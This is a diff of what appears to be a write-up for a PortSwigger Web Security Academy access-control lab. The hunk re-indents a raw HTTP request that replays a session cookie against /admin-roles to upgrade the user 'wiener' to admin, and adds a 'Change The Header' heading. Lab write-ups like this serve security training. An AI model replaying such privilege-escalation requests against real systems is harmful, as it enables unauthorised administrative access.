@@ -284,20 +284,22 @@ Check The Header Show ID
    Copy the Local user session cookie into the existing Burp Repeater request, change the username to yours, and replay it. 
      
      
-     GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
-Host: 0adf0050049b912fc0590c89008000d1.web-security-academy.net
-Cookie: session=rJx1TJ8LuyR3JD1EYR43W5OKaq5UtFM5
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Te: trailers
-Connection: close
+    GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+    Host: 0adf0050049b912fc0590c89008000d1.web-security-academy.net
+    Cookie: session=rJx1TJ8LuyR3JD1EYR43W5OKaq5UtFM5
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
      
      
-
+ ## Change The Header
+ 
+    GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
